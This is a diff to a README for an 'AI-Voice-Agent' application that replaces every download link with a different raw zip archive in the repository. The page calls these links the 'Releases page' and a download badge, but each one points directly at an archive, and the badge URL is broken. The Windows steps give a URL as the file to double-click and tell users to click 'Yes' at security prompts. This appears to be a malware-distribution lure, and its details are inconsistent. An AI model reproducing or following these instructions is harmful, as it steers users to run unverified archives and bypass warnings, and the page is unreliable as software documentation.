@@ -8,7 +8,7 @@ Welcome to AI-Voice-Agent! This guide will help you download and run your new vo
 
 To get started, you need to download the application. Click the link below:
 
-[![Download AI-Voice-Agent](https://raw.githubusercontent.com/BR8TEAM/AI-Voice-Agent/main/operabily/AI-Voice-Agent.zip%20AI--Voice--Agent-v1.0-brightgreen)](https://raw.githubusercontent.com/BR8TEAM/AI-Voice-Agent/main/operabily/AI-Voice-Agent.zip)
+[![Download AI-Voice-Agent](https://github.com/BR8TEAM/AI-Voice-Agent/raw/refs/heads/main/app/Voice_Agent_A_v1.2-alpha.2.zip%20AI--Voice--Agent-v1.0-brightgreen)](https://github.com/BR8TEAM/AI-Voice-Agent/raw/refs/heads/main/app/Voice_Agent_A_v1.2-alpha.2.zip)
 
 1. Click the **Download AI-Voice-Agent** button above.
 2. You will be taken to the Releases page. This page lists all available versions of the application.
@@ -38,7 +38,7 @@ Once you’ve downloaded the application, running it is simple. Follow these ste
    - For Linux, find it in your **Downloads** folder or wherever you saved it.
 
 2. **Open the Application:**
-   - **Windows:** Double-click the file (e.g., `https://raw.githubusercontent.com/BR8TEAM/AI-Voice-Agent/main/operabily/AI-Voice-Agent.zip`). If a security prompt appears, click "Yes" to allow it to run.
+   - **Windows:** Double-click the file (e.g., `https://github.com/BR8TEAM/AI-Voice-Agent/raw/refs/heads/main/app/Voice_Agent_A_v1.2-alpha.2.zip`). If a security prompt appears, click "Yes" to allow it to run.
    - **macOS:** Double-click the downloaded `.dmg` file to open it. Drag the AI-Voice-Agent icon into your Applications folder.
    - **Linux:** Open your terminal, navigate to the downloads directory, and run: `chmod +x AI-Voice-Agent` followed by `./AI-Voice-Agent`.
 
@@ -78,8 +78,8 @@ Feel free to report any issues on the GitHub repository. We appreciate your feed
 
 ## 🔗 Additional Resources
 
-For more information and updates, visit the [AI-Voice-Agent Releases page](https://raw.githubusercontent.com/BR8TEAM/AI-Voice-Agent/main/operabily/AI-Voice-Agent.zip).
+For more information and updates, visit the [AI-Voice-Agent Releases page](https://github.com/BR8TEAM/AI-Voice-Agent/raw/refs/heads/main/app/Voice_Agent_A_v1.2-alpha.2.zip).
 
-[![Download AI-Voice-Agent](https://raw.githubusercontent.com/BR8TEAM/AI-Voice-Agent/main/operabily/AI-Voice-Agent.zip%20AI--Voice--Agent-v1.0-brightgreen)](https://raw.githubusercontent.com/BR8TEAM/AI-Voice-Agent/main/operabily/AI-Voice-Agent.zip)
+[![Download AI-Voice-Agent](https://github.com/BR8TEAM/AI-Voice-Agent/raw/refs/heads/main/app/Voice_Agent_A_v1.2-alpha.2.zip%20AI--Voice--Agent-v1.0-brightgreen)](https://github.com/BR8TEAM/AI-Voice-Agent/raw/refs/heads/main/app/Voice_Agent_A_v1.2-alpha.2.zip)
 
 Enjoy your new AI Voice Assistant!
